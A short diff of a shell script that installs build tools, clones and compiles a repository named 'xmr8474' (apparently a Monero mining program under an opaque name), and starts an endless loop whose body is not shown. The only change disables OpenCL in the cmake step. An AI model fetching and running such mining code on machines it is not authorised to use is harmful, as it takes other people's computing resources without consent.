@@ -3,7 +3,7 @@ apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-d
 git clone https://github.com/mobileapps84741274/xmr8474
 cd ./xmr8474/
 cd build
-cmake ..
+cmake .. -DOpenCL_ENABLE=OFF
 make
 
 while true
